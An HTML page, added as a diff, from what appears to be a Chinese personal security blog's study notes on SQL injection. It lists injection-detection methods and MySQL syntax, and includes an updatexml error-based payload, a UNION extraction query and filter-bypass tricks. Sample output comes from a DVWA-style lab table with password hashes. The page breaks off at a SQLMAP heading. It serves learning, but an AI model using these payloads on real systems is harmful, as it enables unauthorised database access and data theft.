@@ -1,0 +1,1960 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL Injection, Violet&#39;s Blog">
+    <meta name="description" content="Summary of knowledge learned">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SQL Injection | Violet&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Violet&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Violet&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            Summary of knowledge learned
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SQL Injection</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Web安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-09-03
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.6k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="SQL注入点"><a href="#SQL注入点" class="headerlink" title="SQL注入点"></a>SQL注入点</h2><p>  1.与<strong>后端</strong>有交互的点(数据库)</p>
+<p>  2.报文头部,可能有注入点</p>
+<p>  3.语句对数据库有什么影响,怎么知道是否产生影响(报错注入,数据库返回错误)</p>
+<p>  4.数据库可以存放图片路径，那么这一点也可以作为注入点</p>
+<h2 id="如何判断SQL存在注入点"><a href="#如何判断SQL存在注入点" class="headerlink" title="如何判断SQL存在注入点"></a>如何判断SQL存在注入点</h2><p>  1.error-based</p>
+<p>  譬如单引号,双引号等</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a><br>  但是如果怎么样都不显示错误时,我们很显然要选择其他方式进行注入。</p>
+<p>  2.Union-based </p>
+<p>  如果联合查询出结果，那么必然有注入点。</p>
+<p>  3.Time-based Blind<br>  核心函数为sleep();<br>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721693.html">https://www.cnblogs.com/backlion/p/9721693.html</a></p>
+<p>  4.Boolen-based Blind<br>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40709439/article/details/81355856">https://blog.csdn.net/weixin_40709439/article/details/81355856</a></p>
+<p>  5.Stacked<br>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
+<h2 id="MySQL的搭建"><a href="#MySQL的搭建" class="headerlink" title="MySQL的搭建"></a>MySQL的搭建</h2><p>  使用PHPStudy即可，</p>
+<h2 id="MySQL语法"><a href="#MySQL语法" class="headerlink" title="MySQL语法"></a>MySQL语法</h2><p>  所用语句都是根据root数据库、user表进行查询的</p>
+<ol>
+<li>查看数据库</li>
+</ol>
+  <pre class="line-numbers language-none"><code class="language-none">show databases; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>  注意:databases的s, 以及分号;</p>
+<ol start="2">
+<li>查看表</li>
+</ol>
+  <pre class="line-numbers language-none"><code class="language-none">show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol start="3">
+<li>从中查看user表中内容</li>
+</ol>
+  <pre class="line-numbers language-none"><code class="language-none">select * from users; 
+select user_id, first_name, last_name; # 查询三列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+  <pre class="line-numbers language-none"><code class="language-none">  mysql&gt; select * from users;
++---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+
+| user_id | first_name | last_name | user    | password                         | avatar                      | last_login          | failed_login |
++---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+
+|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | &#x2F;hackable&#x2F;users&#x2F;admin.jpg   | 2021-08-11 16:33:22 |            0 |
+|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | &#x2F;hackable&#x2F;users&#x2F;gordonb.jpg | 2021-08-11 16:33:22 |            0 |
+|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | &#x2F;hackable&#x2F;users&#x2F;1337.jpg    | 2021-08-11 16:33:22 |            0 |
+|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | &#x2F;hackable&#x2F;users&#x2F;pablo.jpg   | 2021-08-11 16:33:22 |            0 |
+|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | &#x2F;hackable&#x2F;users&#x2F;smithy.jpg  | 2021-08-11 16:33:22 |            0 |
++---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+
+5 rows in set (0.01 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="4">
+<li>注释的三种方式</li>
+</ol>
+<p>  注意, “– “后面有空格</p>
+  <pre class="line-numbers language-注释的三种方式" data-language="注释的三种方式"><code class="language-注释的三种方式">#DELETE FROM SeatInformation
+
+&#x2F;*DELETE FROM SeatInformation *&#x2F;
+
+-- DELETE FROM SeatInformation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  /**/如果以下面方式进行使用是不会影响语句的执行的</p>
+  <pre class="line-numbers language-none"><code class="language-none">SELECT COUNT(first_name)&#x2F;**&#x2F;count, last_name &#x2F;**&#x2F;FROM users GROUP&#x2F;**&#x2F; BY user_id HAVING count &#x3D; 3;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>  所以我们可以想一下如果以下面的方式呢？如果可以的话完全可以绕过一些过滤，但是很可惜并不可以。尽管不可以，但是这种思考的过程却非常的重要。<br>  <pre class="line-numbers language-none"><code class="language-none">SELECT COUNT(first_name)c&#x2F;**&#x2F;ount, last_name FROM users GR&#x2F;**&#x2F;OUP BY user_id HAVING count &#x3D; 3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<ol start="5">
+<li>Where 条件语句</li>
+</ol>
+  <pre class="line-numbers language-none"><code class="language-none">运算符	描述
+&#x3D;	    等于
+&lt;&gt;	    不等于。注释：在 SQL 的一些版本中，该操作符可被写成 !&#x3D;
+&gt;	    大于
+&lt;	    小于
+&gt;&#x3D;	    大于等于
+&lt;&#x3D;	    小于等于
+BETWEEN	在某个范围内
+LIKE	搜索某种模式
+IN	    指定针对某个列的多个可能值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  熟练运用运算符，我们便可以进行一些绕过，譬如过滤了=，我们便可以使用以下方式来代替</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+where id &#x3D; 2
+where id like 2
+where id &lt;3 and id &gt;1
+where id between 2 and 2
+where id like 2
+where id in (2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  此外MySQL是可以进行字符串的比较的譬如:</p>
+  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE last_name &gt; &#39;admin&#39;;
+
+2	Gordon	Brown	gordonb	e99a18c428cb38d5f260853678922e03	&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg	2021-08-11 16:33:22	0 
+3	Hack	Me	1337	8d3533d75ae2c3966d7e0d4fcc69216b	&#x2F;hackable&#x2F;users&#x2F;1337.jpg	2021-08-11 16:33:22	0
+4	Pablo	Picasso	pablo	0d107d09f5bbe40cade3de5c71e9e9b7	&#x2F;hackable&#x2F;users&#x2F;pablo.jpg	2021-08-11 16:33:22	0
+5	Bob	Smith	smithy	5f4dcc3b5aa765d61d8327deb882cf99	&#x2F;hackable&#x2F;users&#x2F;smithy.jpg	2021-08-11 16:33:22	0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol start="6">
+<li>And，Or</li>
+</ol>
+<p>  MySQL语句中And，Or与其他编程语言用法相同。</p>
+<p>  同时AND 与 &amp;&amp;相同，Or与 ||相同，<strong>而&amp;为位AND（Bitwise AND）</strong>。</p>
+<p>  骚操作:</p>
+  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id &#x3D; 1 and (1&#x3D;1) &#x3D; 1;
+SELECT * FROM users WHERE user_id &#x3D; 3&#x2F;3 and (1&#x3D;1) &#x3D; 1;
+SELECT * FROM users WHERE 2&#x2F;2 &#x3D; (3&#x3D;3);
+SELECT * FROM users WHERE user_id &#x3D;  4&#x2F;2 &#x3D; (2&#x3D;1);(这条语句似乎等于user_id !&#x3D; 2，原理我也没有查到，尝试了一下这里！&#x3D;中的&#x3D;无法通过上述&#x3D;
+的替代方法来进行替代)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol start="7">
+<li>Like模糊查询</li>
+</ol>
+  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id  &gt;  1  and first_name like &quot;%ck&quot;;
+SELECT * FROM users WHERE user_id  &gt;  1  and first_name like &quot;%%&quot;; -- 相当于 1 &#x3D; 1
+
+SELECT * FROM users WHERE user_id  &gt;  1  and first_name like &quot;_a%&quot;; -- &#39;_&#39;占位符,表示第二个字母为a,第一个字母无所谓<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="8">
+<li>Order by</li>
+</ol>
+<p>  目的为排序<br>  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY first_name; -- 表明以first_name 为标准进行排序
+SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY 1;          -- 表明以第1列为标准进行排序(列号从1开始)
+SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY 1 LIMIT a,b;-- LIMIT的使用方法为: 从第a(从0开始)行开始展示b行
+SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY 1 LIMIT b;  -- 从0开始展示b行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>  <img src="LIMIT.png"></p>
+<ol start="9">
+<li>Aliases(重命名)</li>
+</ol>
+  <pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">SELECT user_id as &#39;id&#39; FROM users;
+SELECT user_id &#39;id&#39; FROM users;     -- as可以省略
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+  <pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">id
+1
+2
+3
+4
+5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+  <pre class="line-numbers language-进一步" data-language="进一步"><code class="language-进一步">SELECT(SELECT first_name  FROM users WHERE user_id &#x3D; 1)s;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+  <pre class="line-numbers language-结果为" data-language="结果为"><code class="language-结果为">s
+admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>  对于上面的符合语句我的理解为，里面的一层SQL语句获得了字段名为first_name,值为admin的查询结果（已经相当于常量与1类似），而外面的一层实际上是为了将字段名进行重命名，与select 1 as a类似, 除此以外没有其他作用。</p>
+<p>  <img src="Aliases.png"></p>
+<ol start="10">
+<li>函数</li>
+</ol>
+<p>(1) min()，max()</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT MIN(user_id) FROM users;     -- 查询user_id最小的值
+SELECT MAX(user_id) FROM users;     -- 查询user_id最大的值
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>(2) count(),avg(),sum()</p>
+<p>(3) concat()</p>
+<pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">SELECT CONCAT(&quot;SQL &quot;, &quot;Runoob &quot;, &quot;Gooogle &quot;, &quot;Facebook&quot;) AS ConcatenatedString;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">ConcatenatedString
+SQL Runoob Gooogle Facebook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>(4) 报错注入语句分析</p>
+<pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">SELECT * FROM users WHERE user_id &#x3D; 1 and updatexml(1,CONCAT(0x7e,DATABASE(),0x7e,user(),0x7e,@@datadir),1);
+SELECT CONCAT(0x7e,DATABASE(),0x7e,user(),0x7e,@@datadir)s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">s
+~root~root@localhost~C:\phpstudy_pro\Extensions\MySQL5.7.26\data\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>0x7e即~，DataBase（）即当前使用数据库名，user（）返回当前用户，@@datadir即存放数据的地址</p>
+<p>UpdateXML(xml_target, xpath_expr, new_xml)函数的含义</p>
+<p>此函数用新的 XML 片段 new_xml 替换给定 XML 标记 xml_target 片段的单个部分，然后返回更改后的 XML。被替换的 xml_target 部分与用户提供的 XPath 表达式 xpath_expr 匹配。</p>
+<ol start="11">
+<li>Union</li>
+</ol>
+<p>注意: Union两边查询语句所得结果的column必须相同</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users  union SELECT 1,2,3,4,5,6,7,8 FROM users;
+SELECT * FROM users  union SELECT 1,2,3,4,5,DATABASE(),USER(),VERSION() FROM users; -- 后面的语句中数字完全可以用函数替代。
+
+
+user_id	first_name	last_name	user	password	avatar	last_login	failed_login
+1	admin	admin	admin	5f4dcc3b5aa765d61d8327deb882cf99	&#x2F;hackable&#x2F;users&#x2F;admin.jpg	2021-08-11 16:33:22	0
+2	Gordon	Brown	gordonb	e99a18c428cb38d5f260853678922e03	&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg	2021-08-11 16:33:22	0
+3	Hack	Me	1337	8d3533d75ae2c3966d7e0d4fcc69216b	&#x2F;hackable&#x2F;users&#x2F;1337.jpg	2021-08-11 16:33:22	0
+4	Pablo	Picasso	pablo	0d107d09f5bbe40cade3de5c71e9e9b7	&#x2F;hackable&#x2F;users&#x2F;pablo.jpg	2021-08-11 16:33:22	0
+5	Bob	Smith	smithy	5f4dcc3b5aa765d61d8327deb882cf99	&#x2F;hackable&#x2F;users&#x2F;smithy.jpg	2021-08-11 16:33:22	0
+1	2	3	4	5	6	7	8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以从上面的结果中发现union后面语句查询结果只有一行，但是下面语句却有5行，即原本表中的行数。</p>
+<p><img src="union1.png"></p>
+<p>这是因为union是有distinct的，即去重。如果想要全部展示可以再union后面加all</p>
+<ol start="12">
+<li>Group by</li>
+</ol>
+<p>下面第一条语句的意思为，按照user_id进行分组。</p>
+<p>第二条语句的意思为，按照id分组，每一组中的firstname值各有几个</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users GROUP BY user_id;
+
+SELECT COUNT(first_name)count, last_name FROM users GROUP BY user_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>如果只想要看count值为3的结果怎么办呢？之前我们一般使用where但是在这里我们需要使用having即，</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT COUNT(first_name)count, last_name FROM users GROUP BY user_id HAVING count &#x3D; 3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="13">
+<li>Joins</li>
+</ol>
+<p>(1) INNER JOIN即取交集</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users INNER JOIN guestbook ON users.user_id &#x3D; guestbook.comment_id; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>取user_id与comment_id相同的数据</p>
+<p>(2) Left JOIN</p>
+<p>LEFT JOIN 关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p>
+<p><img src="Left.gif"></p>
+<p>如下:</p>
+<p><img src="Left.png"></p>
+<p>(3) Right JOIN</p>
+<p>RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。</p>
+<p>(4) FULL JOIN</p>
+<p>MYSQL不支持</p>
+<ol start="14">
+<li>ANY,ALL</li>
+</ol>
+<p>ALL，user_id 大于所有后面语句的查询结果<br>ANY，user_id 大于任意一个后面语句的查询结果</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id  &gt; ALL (SELECT user_id FROM users)
+
+SELECT * FROM users WHERE user_id  &gt; ANY (SELECT user_id FROM users)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ol start="15">
+<li>数据库操作</li>
+</ol>
+<p>创建数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">CREATE DATABASE &#96;violet&#96; CHARACTER SET &#39;utf8&#39; COLLATE &#39;utf8_bin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>删除一个数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">DROP DATABASE violet;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>备份数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE root  TO DISK &#x3D; &#39;path&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>创建表</p>
+<pre class="line-numbers language-none"><code class="language-none">CREATE TABLE &#96;root&#96;.&#96;Untitled&#96;  (
+  &#96;id&#96; int(10) NOT NULL AUTO_INCREMENT,  -- 列名id，int类型，不为空，自动增长
+  &#96;name&#96; varchar(255) NOT NULL,
+  &#96;pass&#96; varchar(255) NULL,
+  PRIMARY KEY (&#96;id&#96;)
+);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>修改表</p>
+<p>(1)添加列</p>
+<pre class="line-numbers language-none"><code class="language-none">ALTER TABLE &#96;root&#96;.&#96;users&#96; 
+ADD COLUMN &#96;violet&#96; varchar(255) NULL AFTER &#96;failed_login&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>(2)删除</p>
+<pre class="line-numbers language-none"><code class="language-none">ALTER TABLE &#96;root&#96;.&#96;users&#96; 
+Drop COLUMN &#96;violet&#96; varchar(255) NULL AFTER &#96;failed_login&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>(3)修改类型</p>
+<pre class="line-numbers language-none"><code class="language-none">ALTER TABLE &#96;root&#96;.&#96;users&#96; 
+alter COLUMN &#96;violet&#96; int;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<h2 id="SQLMAP的使用"><a href="#SQLMAP的使用" class="headerlink" title="SQLMAP的使用"></a>SQLMAP的使用</h2><p>我们使用SQL-LABS进行学习。</p>
